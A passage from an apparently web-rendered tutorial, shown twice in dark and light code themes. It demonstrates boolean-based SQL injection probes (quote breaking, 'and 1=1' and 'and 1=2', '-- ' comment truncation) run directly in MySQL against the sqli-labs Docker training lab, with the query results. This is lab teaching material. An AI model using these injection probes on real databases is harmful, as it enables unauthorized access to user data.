<span class="line"><span style="color:#B392F0;">CONTAINER</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">ID</span><span style="color:#E1E4E8;">        </span><span style="color:#9ECBFF;">IMAGE</span><span style="color:#E1E4E8;">                </span><span style="color:#9ECBFF;">COMMAND</span><span style="color:#E1E4E8;">             </span><span style="color:#9ECBFF;">CREATED</span><span style="color:#E1E4E8;">             </span><span style="color:#9ECBFF;">STATUS</span><span style="color:#E1E4E8;">              </span><span style="color:#9ECBFF;">PORTS</span><span style="color:#E1E4E8;">                          </span><span style="color:#9ECBFF;">NAMES</span></span>
<span class="line"><span style="color:#B392F0;">ea6ec615a39e</span><span style="color:#E1E4E8;">        </span><span style="color:#9ECBFF;">acgpiano/sqli-labs</span><span style="color:#E1E4E8;">   </span><span style="color:#9ECBFF;">&quot;/run.sh&quot;</span><span style="color:#E1E4E8;">           </span><span style="color:#79B8FF;">29</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">hours</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">ago</span><span style="color:#E1E4E8;">        </span><span style="color:#9ECBFF;">Up</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">29</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">hours</span><span style="color:#E1E4E8;">         </span><span style="color:#79B8FF;">0.0</span><span style="color:#9ECBFF;">.0.0:80</span><span style="color:#E1E4E8;">-</span><span style="color:#F97583;">&gt;</span><span style="color:#9ECBFF;">80/tcp,</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">3306</span><span style="color:#9ECBFF;">/tcp</span><span style="color:#E1E4E8;">   </span><span style="color:#9ECBFF;">sqli-labs</span></span>
<span class="line"><span style="color:#B392F0;">$</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">sudo</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">docker</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">exec</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">-it</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">ea6ec615a39e</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">/bin/bash</span></span>
<span class="line"><span style="color:#B392F0;">$</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">root@ea6ec615a39e:/#</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">mysql</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">-u</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">root</span></span>
<span class="line"><span style="color:#B392F0;">mysql&gt;</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">use</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">security</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#B392F0;">mysql&gt;</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">SELECT</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">*</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">FROM</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">users</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">WHERE</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">id=&#39;1&#39;</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">LIMIT</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">0</span><span style="color:#9ECBFF;">,1</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#B392F0;">+----+----------+----------+</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">id</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">username</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">password</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#B392F0;">+----+----------+----------+</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;">  </span><span style="color:#B392F0;">1</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">Dumb</span><span style="color:#E1E4E8;">     </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">Dumb</span><span style="color:#E1E4E8;">     </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#B392F0;">+----+----------+----------+</span></span>
<span class="line"><span style="color:#B392F0;">1</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">row</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">in</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">set</span><span style="color:#E1E4E8;"> (0.00 </span><span style="color:#9ECBFF;">sec</span><span style="color:#E1E4E8;">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#B392F0;">mysql&gt;</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">SELECT</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">*</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">FROM</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">users</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">WHERE</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">id=&#39;1 and 1=1&#39;</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">LIMIT</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">0</span><span style="color:#9ECBFF;">,1</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#B392F0;">+----+----------+----------+</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">id</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">username</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">password</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#B392F0;">+----+----------+----------+</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;">  </span><span style="color:#B392F0;">1</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">Dumb</span><span style="color:#E1E4E8;">     </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">Dumb</span><span style="color:#E1E4E8;">     </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#B392F0;">+----+----------+----------+</span></span>
<span class="line"><span style="color:#B392F0;">1</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">row</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">in</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">set,</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">1</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">warning</span><span style="color:#E1E4E8;"> (0.00 </span><span style="color:#9ECBFF;">sec</span><span style="color:#E1E4E8;">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#B392F0;">mysql&gt;</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">SELECT</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">*</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">FROM</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">users</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">WHERE</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">id=&#39;1 and 1=2&#39;</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">LIMIT</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">0</span><span style="color:#9ECBFF;">,1</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#B392F0;">+----+----------+----------+</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">id</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">username</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">password</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#B392F0;">+----+----------+----------+</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;">  </span><span style="color:#B392F0;">1</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">Dumb</span><span style="color:#E1E4E8;">     </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">Dumb</span><span style="color:#E1E4E8;">     </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#B392F0;">+----+----------+----------+</span></span>
<span class="line"><span style="color:#B392F0;">1</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">row</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">in</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">set,</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">1</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">warning</span><span style="color:#E1E4E8;"> (0.00 </span><span style="color:#9ECBFF;">sec</span><span style="color:#E1E4E8;">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#B392F0;">mysql&gt;</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">SELECT</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">*</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">FROM</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">users</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">WHERE</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">id=&#39;1&#39;</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">and</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">1</span><span style="color:#9ECBFF;">=</span><span style="color:#79B8FF;">2</span><span style="color:#9ECBFF;">&#39;&#39;</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">LIMIT</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">0</span><span style="color:#9ECBFF;">,1</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#B392F0;">ERROR</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">1064</span><span style="color:#E1E4E8;"> (42000): You have an error </span><span style="color:#F97583;">in</span><span style="color:#E1E4E8;"> your SQL syntax; </span><span style="color:#B392F0;">check</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">the</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">manual</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">that</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">corresponds</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">to</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">your</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">MySQL</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">server</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">version</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">for</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">the</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">right</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">syntax</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">to</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">use</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">near</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;&#39;&#39; LIMIT 0,1&#39;</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">at</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">line</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">1</span></span>
<span class="line"><span style="color:#B392F0;">mysql&gt;</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">SELECT</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">*</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">FROM</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">users</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">WHERE</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">id=&#39;1&#39;</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">and</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">1</span><span style="color:#9ECBFF;">=</span><span style="color:#79B8FF;">2</span><span style="color:#9ECBFF;">--</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39; LIMIT 0,1;</span></span>
<span class="line"><span style="color:#9ECBFF;">Empty set (0.00 sec)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#9ECBFF;">mysql&gt; SELECT * FROM users WHERE id=&#39;1&#39; and 1=1-- &#39;</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">LIMIT</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">0</span><span style="color:#9ECBFF;">,1</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#B392F0;">+----+----------+----------+</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">id</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">username</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">password</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#B392F0;">+----+----------+----------+</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;">  </span><span style="color:#B392F0;">1</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">Dumb</span><span style="color:#E1E4E8;">     </span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">Dumb</span><span style="color:#E1E4E8;">     </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#B392F0;">+----+----------+----------+</span></span>
<span class="line"><span style="color:#B392F0;">1</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">row</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">in</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">set</span><span style="color:#E1E4E8;"> (0.00 </span><span style="color:#9ECBFF;">sec</span><span style="color:#E1E4E8;">)</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#6F42C1;">$</span><span style="color:#24292E;"> </span><span style="color:#032F62;">sudo</span><span style="color:#24292E;"> </span><span style="color:#032F62;">docker</span><span style="color:#24292E;"> </span><span style="color:#032F62;">ps</span></span>
<span class="line"><span style="color:#6F42C1;">CONTAINER</span><span style="color:#24292E;"> </span><span style="color:#032F62;">ID</span><span style="color:#24292E;">        </span><span style="color:#032F62;">IMAGE</span><span style="color:#24292E;">                </span><span style="color:#032F62;">COMMAND</span><span style="color:#24292E;">             </span><span style="color:#032F62;">CREATED</span><span style="color:#24292E;">             </span><span style="color:#032F62;">STATUS</span><span style="color:#24292E;">              </span><span style="color:#032F62;">PORTS</span><span style="color:#24292E;">                          </span><span style="color:#032F62;">NAMES</span></span>
<span class="line"><span style="color:#6F42C1;">ea6ec615a39e</span><span style="color:#24292E;">        </span><span style="color:#032F62;">acgpiano/sqli-labs</span><span style="color:#24292E;">   </span><span style="color:#032F62;">&quot;/run.sh&quot;</span><span style="color:#24292E;">           </span><span style="color:#005CC5;">29</span><span style="color:#24292E;"> </span><span style="color:#032F62;">hours</span><span style="color:#24292E;"> </span><span style="color:#032F62;">ago</span><span style="color:#24292E;">        </span><span style="color:#032F62;">Up</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">29</span><span style="color:#24292E;"> </span><span style="color:#032F62;">hours</span><span style="color:#24292E;">         </span><span style="color:#005CC5;">0.0</span><span style="color:#032F62;">.0.0:80</span><span style="color:#24292E;">-</span><span style="color:#D73A49;">&gt;</span><span style="color:#032F62;">80/tcp,</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">3306</span><span style="color:#032F62;">/tcp</span><span style="color:#24292E;">   </span><span style="color:#032F62;">sqli-labs</span></span>
<span class="line"><span style="color:#6F42C1;">$</span><span style="color:#24292E;"> </span><span style="color:#032F62;">sudo</span><span style="color:#24292E;"> </span><span style="color:#032F62;">docker</span><span style="color:#24292E;"> </span><span style="color:#032F62;">exec</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">-it</span><span style="color:#24292E;"> </span><span style="color:#032F62;">ea6ec615a39e</span><span style="color:#24292E;"> </span><span style="color:#032F62;">/bin/bash</span></span>
<span class="line"><span style="color:#6F42C1;">$</span><span style="color:#24292E;"> </span><span style="color:#032F62;">root@ea6ec615a39e:/#</span><span style="color:#24292E;"> </span><span style="color:#032F62;">mysql</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">-u</span><span style="color:#24292E;"> </span><span style="color:#032F62;">root</span></span>
<span class="line"><span style="color:#6F42C1;">mysql&gt;</span><span style="color:#24292E;"> </span><span style="color:#032F62;">use</span><span style="color:#24292E;"> </span><span style="color:#032F62;">security</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#6F42C1;">mysql&gt;</span><span style="color:#24292E;"> </span><span style="color:#032F62;">SELECT</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">*</span><span style="color:#24292E;"> </span><span style="color:#032F62;">FROM</span><span style="color:#24292E;"> </span><span style="color:#032F62;">users</span><span style="color:#24292E;"> </span><span style="color:#032F62;">WHERE</span><span style="color:#24292E;"> </span><span style="color:#032F62;">id=&#39;1&#39;</span><span style="color:#24292E;"> </span><span style="color:#032F62;">LIMIT</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">0</span><span style="color:#032F62;">,1</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#6F42C1;">+----+----------+----------+</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">id</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">username</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">password</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#6F42C1;">+----+----------+----------+</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;">  </span><span style="color:#6F42C1;">1</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">Dumb</span><span style="color:#24292E;">     </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">Dumb</span><span style="color:#24292E;">     </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#6F42C1;">+----+----------+----------+</span></span>
<span class="line"><span style="color:#6F42C1;">1</span><span style="color:#24292E;"> </span><span style="color:#032F62;">row</span><span style="color:#24292E;"> </span><span style="color:#032F62;">in</span><span style="color:#24292E;"> </span><span style="color:#032F62;">set</span><span style="color:#24292E;"> (0.00 </span><span style="color:#032F62;">sec</span><span style="color:#24292E;">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6F42C1;">mysql&gt;</span><span style="color:#24292E;"> </span><span style="color:#032F62;">SELECT</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">*</span><span style="color:#24292E;"> </span><span style="color:#032F62;">FROM</span><span style="color:#24292E;"> </span><span style="color:#032F62;">users</span><span style="color:#24292E;"> </span><span style="color:#032F62;">WHERE</span><span style="color:#24292E;"> </span><span style="color:#032F62;">id=&#39;1 and 1=1&#39;</span><span style="color:#24292E;"> </span><span style="color:#032F62;">LIMIT</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">0</span><span style="color:#032F62;">,1</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#6F42C1;">+----+----------+----------+</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">id</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">username</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">password</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#6F42C1;">+----+----------+----------+</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;">  </span><span style="color:#6F42C1;">1</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">Dumb</span><span style="color:#24292E;">     </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">Dumb</span><span style="color:#24292E;">     </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#6F42C1;">+----+----------+----------+</span></span>
<span class="line"><span style="color:#6F42C1;">1</span><span style="color:#24292E;"> </span><span style="color:#032F62;">row</span><span style="color:#24292E;"> </span><span style="color:#032F62;">in</span><span style="color:#24292E;"> </span><span style="color:#032F62;">set,</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">1</span><span style="color:#24292E;"> </span><span style="color:#032F62;">warning</span><span style="color:#24292E;"> (0.00 </span><span style="color:#032F62;">sec</span><span style="color:#24292E;">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6F42C1;">mysql&gt;</span><span style="color:#24292E;"> </span><span style="color:#032F62;">SELECT</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">*</span><span style="color:#24292E;"> </span><span style="color:#032F62;">FROM</span><span style="color:#24292E;"> </span><span style="color:#032F62;">users</span><span style="color:#24292E;"> </span><span style="color:#032F62;">WHERE</span><span style="color:#24292E;"> </span><span style="color:#032F62;">id=&#39;1 and 1=2&#39;</span><span style="color:#24292E;"> </span><span style="color:#032F62;">LIMIT</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">0</span><span style="color:#032F62;">,1</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#6F42C1;">+----+----------+----------+</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">id</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">username</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">password</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#6F42C1;">+----+----------+----------+</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;">  </span><span style="color:#6F42C1;">1</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">Dumb</span><span style="color:#24292E;">     </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">Dumb</span><span style="color:#24292E;">     </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#6F42C1;">+----+----------+----------+</span></span>
<span class="line"><span style="color:#6F42C1;">1</span><span style="color:#24292E;"> </span><span style="color:#032F62;">row</span><span style="color:#24292E;"> </span><span style="color:#032F62;">in</span><span style="color:#24292E;"> </span><span style="color:#032F62;">set,</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">1</span><span style="color:#24292E;"> </span><span style="color:#032F62;">warning</span><span style="color:#24292E;"> (0.00 </span><span style="color:#032F62;">sec</span><span style="color:#24292E;">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6F42C1;">mysql&gt;</span><span style="color:#24292E;"> </span><span style="color:#032F62;">SELECT</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">*</span><span style="color:#24292E;"> </span><span style="color:#032F62;">FROM</span><span style="color:#24292E;"> </span><span style="color:#032F62;">users</span><span style="color:#24292E;"> </span><span style="color:#032F62;">WHERE</span><span style="color:#24292E;"> </span><span style="color:#032F62;">id=&#39;1&#39;</span><span style="color:#24292E;"> </span><span style="color:#032F62;">and</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">1</span><span style="color:#032F62;">=</span><span style="color:#005CC5;">2</span><span style="color:#032F62;">&#39;&#39;</span><span style="color:#24292E;"> </span><span style="color:#032F62;">LIMIT</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">0</span><span style="color:#032F62;">,1</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#6F42C1;">ERROR</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">1064</span><span style="color:#24292E;"> (42000): You have an error </span><span style="color:#D73A49;">in</span><span style="color:#24292E;"> your SQL syntax; </span><span style="color:#6F42C1;">check</span><span style="color:#24292E;"> </span><span style="color:#032F62;">the</span><span style="color:#24292E;"> </span><span style="color:#032F62;">manual</span><span style="color:#24292E;"> </span><span style="color:#032F62;">that</span><span style="color:#24292E;"> </span><span style="color:#032F62;">corresponds</span><span style="color:#24292E;"> </span><span style="color:#032F62;">to</span><span style="color:#24292E;"> </span><span style="color:#032F62;">your</span><span style="color:#24292E;"> </span><span style="color:#032F62;">MySQL</span><span style="color:#24292E;"> </span><span style="color:#032F62;">server</span><span style="color:#24292E;"> </span><span style="color:#032F62;">version</span><span style="color:#24292E;"> </span><span style="color:#032F62;">for</span><span style="color:#24292E;"> </span><span style="color:#032F62;">the</span><span style="color:#24292E;"> </span><span style="color:#032F62;">right</span><span style="color:#24292E;"> </span><span style="color:#032F62;">syntax</span><span style="color:#24292E;"> </span><span style="color:#032F62;">to</span><span style="color:#24292E;"> </span><span style="color:#032F62;">use</span><span style="color:#24292E;"> </span><span style="color:#032F62;">near</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;&#39;&#39; LIMIT 0,1&#39;</span><span style="color:#24292E;"> </span><span style="color:#032F62;">at</span><span style="color:#24292E;"> </span><span style="color:#032F62;">line</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">1</span></span>
<span class="line"><span style="color:#6F42C1;">mysql&gt;</span><span style="color:#24292E;"> </span><span style="color:#032F62;">SELECT</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">*</span><span style="color:#24292E;"> </span><span style="color:#032F62;">FROM</span><span style="color:#24292E;"> </span><span style="color:#032F62;">users</span><span style="color:#24292E;"> </span><span style="color:#032F62;">WHERE</span><span style="color:#24292E;"> </span><span style="color:#032F62;">id=&#39;1&#39;</span><span style="color:#24292E;"> </span><span style="color:#032F62;">and</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">1</span><span style="color:#032F62;">=</span><span style="color:#005CC5;">2</span><span style="color:#032F62;">--</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39; LIMIT 0,1;</span></span>
<span class="line"><span style="color:#032F62;">Empty set (0.00 sec)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#032F62;">mysql&gt; SELECT * FROM users WHERE id=&#39;1&#39; and 1=1-- &#39;</span><span style="color:#24292E;"> </span><span style="color:#032F62;">LIMIT</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">0</span><span style="color:#032F62;">,1</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#6F42C1;">+----+----------+----------+</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">id</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">username</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">password</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#6F42C1;">+----+----------+----------+</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;">  </span><span style="color:#6F42C1;">1</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">Dumb</span><span style="color:#24292E;">     </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">Dumb</span><span style="color:#24292E;">     </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#6F42C1;">+----+----------+----------+</span></span>
